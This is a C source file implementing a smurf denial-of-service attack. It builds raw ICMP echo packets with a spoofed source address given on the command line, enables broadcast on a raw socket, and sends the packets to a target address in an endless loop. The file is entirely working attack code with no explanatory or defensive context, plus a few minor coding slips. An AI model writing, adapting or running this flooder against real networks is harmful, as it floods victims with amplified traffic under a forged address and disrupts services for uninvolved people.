#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

unsigned short checksum (uint16_t *buf, int len) 
{
    int sum = 0;

    while( len > 1 )
    {
        sum += ntohs( *buf );
        buf++;
        len -= 2;
    }

    if ( len == 1 )
        sum += *((uint8_t*)buf);

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return htons( (~sum) & 0xffff );
}

int smurf(char* src, char* dst)
{
	uint32_t src_ip;
	inet_pton(AF_INET, src, &src_ip);
	uint32_t dst_ip;
	inet_pton(AF_INET, dst, &dst_ip);

	struct sockaddr_in ipv4_addr;
	bzero(&ipv4_addr, sizeof(ipv4_addr));
	ipv4_addr.sin_family = AF_INET;
	ipv4_addr.sin_port = htons(0);
	memcpy(&ipv4_addr.sin_addr.s_addr, &dst_ip, 4);

	struct iphdr *ip_hdr;
	struct icmphdr *icmp;
	struct timeval *tval;
	int bytes;
	uint16_t pkt_len;
	uint8_t pkt[65535] = {0};
	uint8_t* data_ptr;    
	char *data_str = "smurf! smurf! smurf! ";
	uint16_t data_len = strlen(data_str);
	
	ip_hdr = (struct iphdr*)&pkt[0];
	icmp = (struct icmphdr*)&pkt[sizeof(struct ip)];
	tval = (struct timeval *)&pkt[sizeof(struct iphdr) + sizeof(struct icmphdr)];
	data_ptr = &pkt[sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct timeval)];
	pkt_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + sizeof(struct timeval) + data_len;
	
    //ip header
    ip_hdr->version = 4;
    ip_hdr->ihl = 5;
    ip_hdr->tos = 0;
    ip_hdr->tot_len = htons(pkt_len);
    ip_hdr->id  = random() && 0x00ffff;
    ip_hdr->frag_off = htons(0);
    ip_hdr->ttl = 255;
    ip_hdr->protocol = IPPROTO_ICMP;
    ip_hdr->check = 0;
	ip_hdr->saddr = src_ip;
	ip_hdr->daddr = dst_ip;
    //*(uint32_t*)&pkt[12] = src_ip;
    //*(uint32_t*)&pkt[16] = dst_ip;
    /*compute the IP header checksum.*/
    ip_hdr->check = checksum((u_int16_t *)ip_hdr, sizeof(*ip_hdr));	
	
	//icmp header
	int sequence = 1;
	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->checksum = 0; 
	icmp->un.echo.sequence = htons(sequence);
	icmp->un.echo.id = (((ip_hdr->saddr) >> 16) ^ ip_hdr->saddr) & 0x00ffff;
	gettimeofday(tval, NULL);

	//data
	memcpy(data_ptr, data_str, data_len);
	icmp->checksum = checksum((u_int16_t *)icmp, pkt_len-sizeof(struct iphdr));

	int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	int broadcast_pings = 1; 
	if(setsockopt(fd, SOL_SOCKET, SO_BROADCAST, &broadcast_pings, sizeof(int)) < 0)
	{
		printf("setsockopt: %s\n", strerror(errno));
		return -1;		
	}
	if(connect(fd, (struct sockaddr *)&ipv4_addr, sizeof (ipv4_addr)) < 0)
	{
		printf("connect: %s\n", strerror(errno));
		return -1;	
	}
	
	for(;;)
	{
		if(sendto(fd, pkt, pkt_len, 0, (struct sockaddr *)&ipv4_addr, sizeof (ipv4_addr)) < 0)
			printf("sendto: %s, errno %d\n", strerror(errno), errno);	

		//update
		icmp->un.echo.sequence = htons(++sequence);
		gettimeofday(tval, NULL);
		icmp->checksum = 0;
		icmp->checksum = checksum((u_int16_t *)icmp, pkt_len-sizeof(struct iphdr));
	}
}

int main(int argc, char **argv)
{
	smurf(argv[1], argv[2]);
	return 0;
}
